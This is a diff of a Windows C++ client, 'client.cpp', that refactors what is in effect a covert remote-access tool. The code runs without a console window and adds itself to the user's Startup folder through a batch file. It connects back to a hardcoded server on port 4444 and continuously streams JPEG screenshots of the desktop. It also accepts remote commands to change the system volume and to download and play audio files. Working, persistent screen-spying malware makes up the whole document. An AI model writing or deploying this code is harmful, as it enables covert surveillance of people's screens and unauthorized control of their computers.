@@ -1,9 +1,12 @@
 // client.cpp
+#define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <gdiplus.h>
-#include <mmsystem.h>        // for PlaySound
+#include <mmsystem.h>
+#include <mmdeviceapi.h>
+#include <endpointvolume.h>
 #include <string>
 #include <thread>
 #include <fstream>
@@ -16,237 +19,155 @@
 #pragma comment(lib, "ole32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
-const char* SERVER_IP = "192.168.0.104";  // change to your server IP
+const char* SERVER_IP = "192.168.0.104"; // <<< CHANGE TO YOUR SERVER IP
 const int PORT = 4444;
 
-// ------------------------------------------------------------------
-// Volume control (Mixer API – set master volume 0..100)
-// ------------------------------------------------------------------
-void SetSystemVolume(int volPercent) {
-    HMIXER hMixer;
-    if (mixerOpen(&hMixer, 0, 0, 0, MIXER_OBJECTF_MIXER) != MMSYSERR_NOERROR)
-        return;
-    MIXERLINE ml = { sizeof(ml) };
-    ml.dwComponentType = MIXERLINE_COMPONENTTYPE_DST_SPEAKERS;
-    if (mixerGetLineInfo((HMIXEROBJ)hMixer, &ml, MIXER_GETLINEINFOF_COMPONENTTYPE)
-        != MMSYSERR_NOERROR) {
-        mixerClose(hMixer);
-        return;
+// ---------- volume control (modern API, works on Vista+) ----------
+void SetVolume(int vol) { // vol 0..100
+    CoInitialize(0);
+    IMMDeviceEnumerator* pEnum = 0;
+    IMMDevice* pDev = 0;
+    IAudioEndpointVolume* pVol = 0;
+    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,
+                   __uuidof(IMMDeviceEnumerator),(void**)&pEnum)) &&
+        SUCCEEDED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDev)) &&
+        SUCCEEDED(pDev->Activate(__uuidof(IAudioEndpointVolume),CLSCTX_ALL,0,(void**)&pVol))) {
+        pVol->SetMasterVolumeLevelScalar(vol / 100.0f, 0);
+        pVol->Release();
     }
-    MIXERLINECONTROLS mlc = { sizeof(mlc) };
-    MIXERCONTROL mc = { sizeof(mc) };
-    mlc.cControls = 1;
-    mlc.cbmxctrl = sizeof(mc);
-    mlc.pamxctrl = &mc;
-    mlc.dwLineID = ml.dwLineID;
-    mlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
-    if (mixerGetLineControls((HMIXEROBJ)hMixer, &mlc, MIXER_GETLINECONTROLSF_ONEBYTYPE)
-        != MMSYSERR_NOERROR) {
-        mixerClose(hMixer);
-        return;
-    }
-    // Scale percentage to hardware value (assume max = 0xFFFF)
-    DWORD val = (volPercent * 0xFFFF) / 100;
-    MIXERCONTROLDETAILS mcd = { sizeof(mcd) };
-    MIXERCONTROLDETAILS_UNSIGNED mcdu = { val };
-    mcd.hwndOwner = NULL;
-    mcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
-    mcd.paDetails = &mcdu;
-    mcd.cChannels = 1;        // set both channels? try 1 first
-    mcd.dwControlID = mc.dwControlID;
-    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd, MIXER_SETCONTROLDETAILSF_VALUE);
-    // If stereo, set second channel too
-    MIXERCONTROLDETAILS mcd2 = { sizeof(mcd2) };
-    MIXERCONTROLDETAILS_UNSIGNED mcdu2 = { val };
-    mcd2.hwndOwner = NULL;
-    mcd2.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
-    mcd2.paDetails = &mcdu2;
-    mcd2.cChannels = 2;       // actually need to set for each channel
-    mcd2.dwControlID = mc.dwControlID;
-    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd2, MIXER_SETCONTROLDETAILSF_VALUE);
-    mixerClose(hMixer);
+    if(pDev) pDev->Release();
+    if(pEnum) pEnum->Release();
+    CoUninitialize();
 }
 
-// ------------------------------------------------------------------
-// JPEG encoder helper
-// ------------------------------------------------------------------
-int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
-    UINT num = 0, size = 0;
+// ---------- JPEG encoder ----------
+int GetEncoderClsid(const WCHAR* mime, CLSID* clsid) {
+    UINT num=0, size=0;
     Gdiplus::GetImageEncodersSize(&num, &size);
-    if (size == 0) return -1;
-    Gdiplus::ImageCodecInfo* pCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
-    Gdiplus::GetImageEncoders(num, size, pCodecInfo);
-    for (UINT j = 0; j < num; ++j) {
-        if (wcscmp(pCodecInfo[j].MimeType, format) == 0) {
-            *pClsid = pCodecInfo[j].Clsid;
-            free(pCodecInfo);
-            return j;
+    if(!size) return -1;
+    Gdiplus::ImageCodecInfo* p = (Gdiplus::ImageCodecInfo*)malloc(size);
+    Gdiplus::GetImageEncoders(num, size, p);
+    for(UINT i=0; i<num; i++) {
+        if(wcscmp(p[i].MimeType, mime)==0) {
+            *clsid = p[i].Clsid;
+            free(p);
+            return i;
         }
     }
-    free(pCodecInfo);
+    free(p);
     return -1;
 }
 
-// ------------------------------------------------------------------
-// Reliable send all bytes
-// ------------------------------------------------------------------
-bool SendAll(SOCKET sock, const char* data, int len) {
-    int total = 0;
-    while (total < len) {
-        int sent = send(sock, data + total, len - total, 0);
-        if (sent <= 0) return false;
-        total += sent;
+bool SendAll(SOCKET s, const char* d, int len) {
+    int total=0;
+    while(total<len) {
+        int n = send(s, d+total, len-total, 0);
+        if(n<=0) return false;
+        total += n;
     }
     return true;
 }
 
-// ------------------------------------------------------------------
-// Reliable recv all bytes
-// ------------------------------------------------------------------
-bool RecvAll(SOCKET sock, char* data, int len) {
-    int total = 0;
-    while (total < len) {
-        int got = recv(sock, data + total, len - total, 0);
-        if (got <= 0) return false;
-        total += got;
+bool RecvAll(SOCKET s, char* d, int len) {
+    int total=0;
+    while(total<len) {
+        int n = recv(s, d+total, len-total, 0);
+        if(n<=0) return false;
+        total += n;
     }
     return true;
 }
 
-// ------------------------------------------------------------------
-// Play a sound file (MP3) using MCI
-// ------------------------------------------------------------------
-void PlayRemoteSound(const std::string& filename) {
-    std::string cmd = "open \"" + filename + "\" type mpegvideo alias nyxsound";
-    mciSendStringA(cmd.c_str(), NULL, 0, NULL);
-    mciSendStringA("play nyxsound", NULL, 0, NULL);
-    // We won't wait; it plays asynchronously
-}
-
-// ------------------------------------------------------------------
-// Command handler thread – listens for 'V' and 'P' commands
-// ------------------------------------------------------------------
-void CommandListener(SOCKET sock) {
-    while (true) {
+void CommandListener(SOCKET s) {
+    while(true) {
         char cmd;
-        if (recv(sock, &cmd, 1, 0) != 1)
-            break;  // connection lost
-
-        if (cmd == 'V') {
+        if(recv(s, &cmd,1,0) != 1) break;
+        if(cmd == 'V') {
             int vol;
-            if (!RecvAll(sock, (char*)&vol, 4)) break;
-            SetSystemVolume(vol);
-        }
-        else if (cmd == 'P') {
-            int fsize;
-            if (!RecvAll(sock, (char*)&fsize, 4)) break;
-            std::vector<char> buf(fsize);
-            if (!RecvAll(sock, buf.data(), fsize)) break;
-
-            // Save to temp file
-            char tmpPath[MAX_PATH];
-            GetTempPathA(MAX_PATH, tmpPath);
-            std::string tmpFile = std::string(tmpPath) + "nyx_remote.mp3";
-            std::ofstream out(tmpFile, std::ios::binary);
-            out.write(buf.data(), fsize);
+            if(!RecvAll(s, (char*)&vol, 4)) break;
+            SetVolume(vol);
+        } else if(cmd == 'P') {
+            int sz;
+            if(!RecvAll(s, (char*)&sz, 4)) break;
+            std::vector<char> buf(sz);
+            if(!RecvAll(s, buf.data(), sz)) break;
+            char tmp[MAX_PATH];
+            GetTempPathA(MAX_PATH, tmp);
+            std::string f = std::string(tmp) + "nyx_remote.mp3";
+            std::ofstream out(f, std::ios::binary);
+            out.write(buf.data(), sz);
             out.close();
-            PlayRemoteSound(tmpFile);
-            // Optionally delete after playing? Won't, for now.
-        }
-        else {
-            break;  // unknown command
+            // play asynchronously
+            mciSendStringA(("open \"" + f + "\" type mpegvideo alias nyx").c_str(), 0,0,0);
+            mciSendStringA("play nyx", 0,0,0);
         }
     }
 }
 
-// ------------------------------------------------------------------
-// Main – add to startup, connect, stream screenshots + listen commands
-// ------------------------------------------------------------------
 int main() {
-    // Add to startup
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-    std::string startup = std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
-    std::ofstream bat(startup);
-    bat << "@echo off\nstart \"\" \"" << path << "\"";
+    // startup persistence
+    char me[MAX_PATH];
+    GetModuleFileNameA(0, me, MAX_PATH);
+    std::string start = std::string(getenv("USERPROFILE")) +
+        "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
+    std::ofstream bat(start);
+    bat << "@echo off\nstart \"\" \"" << me << "\"\n";
     bat.close();
 
-    while (true) {
-        WSADATA wsa;
-        WSAStartup(MAKEWORD(2,2), &wsa);
+    while(true) {
+        WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == INVALID_SOCKET) {
-            WSACleanup();
-            Sleep(5000);
-            continue;
-        }
-        sockaddr_in addr;
+        sockaddr_in addr{};
         addr.sin_family = AF_INET;
         addr.sin_port = htons(PORT);
         inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);
+        if(connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
+            std::thread cmd(CommandListener, sock);
+            cmd.detach();
 
-        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
-            closesocket(sock);
-            WSACleanup();
-            Sleep(5000);
-            continue;
-        }
+            Gdiplus::GdiplusStartupInput gdip;
+            ULONG_PTR gdipTok;
+            Gdiplus::GdiplusStartup(&gdipTok, &gdip, 0);
+            CLSID jpegClsid;
+            GetEncoderClsid(L"image/jpeg", &jpegClsid);
 
-        // Start command listener thread
-        std::thread cmdThread(CommandListener, sock);
-        cmdThread.detach();
+            while(true) {
+                // capture screen
+                HWND hwnd = GetDesktopWindow();
+                HDC hdc = GetDC(hwnd);
+                RECT r; GetClientRect(hwnd, &r);
+                int w = r.right, h = r.bottom;
+                HDC mem = CreateCompatibleDC(hdc);
+                HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
+                SelectObject(mem, bmp);
+                BitBlt(mem,0,0,w,h, hdc,0,0, SRCCOPY);
+                Gdiplus::Bitmap gdibmp(bmp, NULL);
+                DeleteObject(bmp); DeleteDC(mem);
+                ReleaseDC(hwnd, hdc);
 
-        // Initialize GDI+ once per connection
-        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
-        ULONG_PTR gdiplusToken;
-        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-        CLSID jpegClsid;
-        GetEncoderClsid(L"image/jpeg", &jpegClsid);
+                IStream* strm = 0;
+                CreateStreamOnHGlobal(0, TRUE, &strm);
+                gdibmp.Save(strm, &jpegClsid, 0);
+                STATSTG st; strm->Stat(&st, STATFLAG_NONAME);
+                ULONG len = st.cbSize.LowPart;
+                BYTE* data = new BYTE[len];
+                LARGE_INTEGER li{};
+                strm->Seek(li, STREAM_SEEK_SET, 0);
+                ULONG rd; strm->Read(data, len, &rd);
+                strm->Release();
 
-        // Screenshot loop
-        while (true) {
-            HWND hwnd = GetDesktopWindow();
-            HDC hdc = GetDC(hwnd);
-            RECT rect;
-            GetClientRect(hwnd, &rect);
-            int w = rect.right, h = rect.bottom;
-            HDC hdcMem = CreateCompatibleDC(hdc);
-            HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
-            SelectObject(hdcMem, hBitmap);
-            BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
-
-            Gdiplus::Bitmap bitmap(hBitmap, NULL);
-            DeleteObject(hBitmap);
-            DeleteDC(hdcMem);
-            ReleaseDC(hwnd, hdc);
-
-            IStream* pStream = NULL;
-            CreateStreamOnHGlobal(NULL, TRUE, &pStream);
-            bitmap.Save(pStream, &jpegClsid, NULL);
-
-            STATSTG stat;
-            pStream->Stat(&stat, STATFLAG_NONAME);
-            ULONG jpegSize = stat.cbSize.LowPart;
-            BYTE* jpegData = new BYTE[jpegSize];
-            LARGE_INTEGER li = {};
-            pStream->Seek(li, STREAM_SEEK_SET, NULL);
-            ULONG bytesRead;
-            pStream->Read(jpegData, jpegSize, &bytesRead);
-            pStream->Release();
-
-            if (!SendAll(sock, (char*)&jpegSize, 4) ||
-                !SendAll(sock, (char*)jpegData, jpegSize)) {
-                delete[] jpegData;
-                break;
+                if(!SendAll(sock, (char*)&len, 4) || !SendAll(sock, (char*)data, len)) {
+                    delete[] data;
+                    break;
+                }
+                delete[] data;
+                Sleep(180);
             }
-            delete[] jpegData;
-            Sleep(180);
+            Gdiplus::GdiplusShutdown(gdipTok);
         }
-
-        Gdiplus::GdiplusShutdown(gdiplusToken);
         closesocket(sock);
         WSACleanup();
-        Sleep(3000);
+        Sleep(5000);
     }
     return 0;
 }
